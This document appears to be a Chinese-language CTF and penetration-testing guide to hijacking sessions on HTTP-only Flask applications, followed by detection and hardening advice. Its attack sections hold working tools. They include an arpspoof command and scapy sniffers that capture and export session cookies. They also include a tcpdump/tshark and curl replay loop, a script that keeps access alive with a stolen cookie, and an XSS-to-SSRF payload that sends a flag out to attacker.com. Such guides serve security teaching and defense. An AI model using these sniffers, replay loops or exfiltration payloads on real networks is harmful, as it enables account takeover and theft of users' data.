# HTTP 明文会话劫持攻击

## 1. 概述

### 1.1 攻击原理

当 Web 应用 exclusively 使用 HTTP（无 HTTPS/TLS 加密）传输数据，且会话 Cookie 缺少 Secure 标志时，攻击者可以通过网络嗅探截获明文传输的会话 Cookie，从而劫持受害者会话。

### 1.2 攻击条件

- 应用仅使用 HTTP 协议（端口 80）
- 会话 Cookie 无 Secure 标志
- 攻击者处于网络中间人位置（同一 WiFi、ARP 欺骗、ISP 级别等）

### 1.3 攻击影响

- **完全会话接管**：攻击者可以受害者身份执行任何操作
- **敏感数据泄露**：访问受害者账户中的所有数据
- **权限提升**：如果受害者是管理员，攻击者获得管理员权限

---

## 2. 攻击场景

### 2.1 Flask 应用会话劫持

**目标环境：**
- Flask 应用运行在 HTTP 端口 80
- 使用 Flask 默认会话 Cookie
- Cookie 配置：`HttpOnly=True, Secure=False, SameSite=None`
- 硬编码弱密钥：`app.secret_key = 'supersecretkey'`

**脆弱代码：**
```python
from flask import Flask, session

app = Flask(__name__)
app.secret_key = 'supersecretkey'  # ⚠️ 硬编码弱密钥

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/admin/flag')
def admin_flag():
    # 无认证检查，仅 IP 限制
    if request.remote_addr != '127.0.0.1':
        abort(403)
    return render_template('flag.html', flag=FLAG)
```

**攻击步骤：**

**步骤 1：网络定位**
```bash
# 攻击者连接到同一 WiFi 网络
# 或使用 ARP 欺骗工具（如 arpspoof）将流量重定向到攻击者机器
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
```

**步骤 2：启动嗅探器**
```python
# session_hijacking_demo.py
from scapy.all import *

captured_cookies = []

def packet_callback(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        payload = packet[Raw].load.decode('utf-8', errors='ignore')
        
        # 检测 HTTP Cookie
        if 'Cookie:' in payload and 'session=' in payload:
            for line in payload.split('\r\n'):
                if 'Cookie:' in line:
                    cookie = line.split('Cookie:')[1].strip()
                    if 'session=' in cookie:
                        captured_cookies.append(cookie)
                        print(f"[+] Captured Session Cookie: {cookie}")

sniff(iface='eth0', prn=packet_callback, store=0)
```

**步骤 3：截获会话**
```
[STEP 1] Starting HTTP traffic sniffer...
[STEP 2] Waiting for victim to access application...
[+] Captured Session Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkVpdGhlciBVUkwgb3IgTWFya2Rvd24gdGV4dCBpcyByZXF1aXJlZCEiXX1dfQ.aQShKA.wDPBLT9QRr-ZYdtrMmR6A0TlH20
```

**步骤 4：会话劫持**
```bash
# 使用截获的 Cookie 访问应用
curl -b "session=eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkVpdGhlciBVUkwgb3IgTWFya2Rvd24gdGV4dCBpcyByZXF1aXJlZCEiXX1dfQ.aQShKA.wDPBLT9QRr-ZYdtrMmR6A0TlH20" \
  http://target/
```

**步骤 5：验证劫持成功**
```
[STEP 3] Attacker: Impersonating Victim with Stolen Session
[VERIFY] ✓ CONFIRMED: Attacker has successfully stolen the victim's session!
STATUS: SESSION HIJACKING ATTACK SUCCESSFUL ✓
```

### 2.2 结合 SSRF 的 Flag 提取

**攻击场景：**
- 受害者是管理员（可访问内部网络）
- 应用存在 SSRF 漏洞
- HTTP 明文传输

**攻击 Payload：**
```javascript
// 注入 XSS 触发 SSRF
<script>
// 通过 SSRF 访问管理端点
fetch('/convert', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'url=http://127.0.0.1/admin/flag'
})
.then(r => r.text())
.then(html => {
    // 提取 Flag
    const flag = html.match(/flag\{[^}]+\}/)[0];
    
    // 通过 HTTP 外带（明文传输）
    fetch('http://attacker.com/exfil?flag=' + flag);
});
</script>
```

**攻击流程：**
```
攻击者网络嗅探
    ↓
截获受害者 HTTP 流量
    ↓
提取会话 Cookie
    ↓
使用 Cookie 访问应用
    ↓
注入 XSS Payload
    ↓
触发 SSRF 获取 Flag
    ↓
Flag 通过 HTTP 外带
```

---

## 3. 高级攻击技术

### 3.1 批量会话收集

**攻击脚本：**
```python
# mass_session_collector.py
from scapy.all import *
import time

class SessionCollector:
    def __init__(self, interface='eth0'):
        self.interface = interface
        self.sessions = {}
        
    def capture(self, timeout=300):
        """捕获指定时长的会话"""
        start_time = time.time()
        
        def callback(packet):
            if time.time() - start_time > timeout:
                return
            
            if packet.haslayer(TCP) and packet.haslayer(Raw):
                payload = packet[Raw].load.decode('utf-8', errors='ignore')
                
                if 'Cookie:' in payload and 'session=' in payload:
                    # 提取源 IP
                    src_ip = packet[IP].src
                    
                    # 提取 Cookie
                    for line in payload.split('\r\n'):
                        if 'Cookie:' in line:
                            cookie = line.split('Cookie:')[1].strip()
                            
                            if src_ip not in self.sessions:
                                self.sessions[src_ip] = []
                            
                            if cookie not in self.sessions[src_ip]:
                                self.sessions[src_ip].append(cookie)
                                print(f"[+] {src_ip}: {cookie[:50]}...")
        
        sniff(iface=self.interface, prn=callback, store=0)
        
    def export(self, filename='sessions.txt'):
        """导出捕获的会话"""
        with open(filename, 'w') as f:
            for ip, cookies in self.sessions.items():
                for cookie in cookies:
                    f.write(f"{ip}\t{cookie}\n")
        print(f"[+] Exported {sum(len(c) for c in self.sessions.values())} sessions to {filename}")

# 使用
collector = SessionCollector()
collector.capture(timeout=600)  # 捕获 10 分钟
collector.export()
```

### 3.2 会话重放攻击

**攻击步骤：**

1. **捕获会话**
   ```bash
   # 使用 tcpdump 捕获流量
   tcpdump -i eth0 -s 0 -w capture.pcap port 80
   ```

2. **提取 Cookie**
   ```bash
   # 使用 tshark 提取 Cookie
   tshark -r capture.pcap -Y 'http.cookie' -T fields \
          -e ip.src -e http.cookie > cookies.txt
   ```

3. **重放请求**
   ```bash
   # 使用捕获的 Cookie 重放请求
   while read ip cookie; do
       curl -b "$cookie" http://target/admin/flag >> flags.txt
   done < cookies.txt
   ```

### 3.3 持久化访问

**场景：** 会话无过期时间

**攻击方法：**
```python
# persistent_access.py
import requests
import time

STOLEN_COOKIE = "session=eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkVpdGhlciBVUkwgb3IgTWFya2Rvd24gdGV4dCBpcyByZXF1aXJlZCEiXX1dfQ.aQShKA.wDPBLT9QRr-ZYdtrMmR6A0TlH20"

def maintain_access():
    """定期验证会话有效性"""
    while True:
        try:
            response = requests.get(
                'http://target/',
                headers={'Cookie': STOLEN_COOKIE}
            )
            
            if response.status_code == 200:
                print(f"[+] Session still valid at {time.strftime('%H:%M:%S')}")
                
                # 定期检查敏感数据
                if 'flag' in response.text.lower():
                    print("[!] Flag detected in response!")
            else:
                print(f"[-] Session invalidated: {response.status_code}")
                break
                
        except Exception as e:
            print(f"[-] Error: {e}")
        
        time.sleep(60)  # 每分钟检查一次

maintain_access()
```

---

## 4. 检测与防御

### 4.1 检测方法

**网络监控：**
- 检测 ARP 欺骗攻击
- 监控异常 HTTP 流量模式
- 记录所有会话 Cookie 访问

**日志分析：**
```
# 检测会话劫持的日志特征
- 同一会话 ID 来自不同 IP
- 会话创建时间与使用时间间隔异常
- 会话使用模式突然改变
```

**自动化检测脚本：**
```python
# session_anomaly_detector.py
from collections import defaultdict
import time

class SessionAnomalyDetector:
    def __init__(self):
        self.session_ips = defaultdict(set)
        self.session_times = defaultdict(list)
        
    def log_request(self, session_id, client_ip):
        """记录请求"""
        self.session_ips[session_id].add(client_ip)
        self.session_times[session_id].append(time.time())
        
        # 检测多 IP 使用
        if len(self.session_ips[session_id]) > 1:
            print(f"[!] ALERT: Session {session_id[:20]} used from multiple IPs:")
            print(f"    IPs: {self.session_ips[session_id]}")
            return True
        
        # 检测异常频率
        recent = [t for t in self.session_times[session_id] 
                  if time.time() - t < 60]
        if len(recent) > 100:  # 1 分钟内超过 100 次请求
            print(f"[!] ALERT: Session {session_id[:20]} has abnormal request frequency")
            return True
        
        return False
```

### 4.2 防御措施

**立即修复：**

1. **强制 HTTPS**
   ```python
   @app.before_request
   def enforce_https():
       if not request.is_secure and app.config['ENV'] == 'production':
           url = request.url.replace('http://', 'https://', 1)
           return redirect(url, code=301)
   ```

2. **设置 Secure 标志**
   ```python
   app.config.update(
       SESSION_COOKIE_SECURE=True,  # 仅通过 HTTPS 传输
       SESSION_COOKIE_HTTPONLY=True,  # 防止 JavaScript 访问
       SESSION_COOKIE_SAMESITE='Lax'  # 防止 CSRF
   )
   ```

3. **实施会话超时**
   ```python
   from datetime import timedelta
   
   app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=30)
   app.config['SESSION_REFRESH_EACH_OK'] = True
   ```

**长期改进：**

4. **使用强密钥**
   ```python
   import secrets
   
   # 生成 256 位随机密钥
   app.secret_key = secrets.token_hex(32)
   
   # 从环境变量加载
   app.secret_key = os.environ.get('SECRET_KEY')
   ```

5. **会话绑定**
   ```python
   @app.before_request
   def bind_session():
       if 'client_ip' in session:
           if session['client_ip'] != request.remote_addr:
               # 检测到会话劫持
               session.clear()
               abort(403)
       else:
           session['client_ip'] = request.remote_addr
   ```

6. **实施 HSTS**
   ```python
   @app.after_request
   def add_hsts(response):
       response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
       return response
   ```

---

## 5. 攻击案例总结

| 案例 | 环境 | 攻击方法 | 影响 | 修复 |
|------|------|---------|------|------|
| Flask Markdown 转换器 | HTTP + 无 Secure | 网络嗅探 | 会话劫持 + Flag 泄露 | HTTPS + Secure Cookie |
| 内部管理系统 | HTTP + 弱密钥 | 嗅探 + 伪造 | 管理员权限接管 | HTTPS + 强密钥 + 会话绑定 |
| CTF 挑战平台 | HTTP + 无过期 | 持久化访问 | 长期未授权访问 | 会话超时 + 登出机制 |

---

## 6. 参考资源

- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)
- [RFC 6265 - HTTP State Management Mechanism](https://tools.ietf.org/html/rfc6265)

---

**文档版本：** 1.0  
**最后更新：** 2026 年 3 月  
**适用场景：** CTF 挑战、渗透测试、安全审计
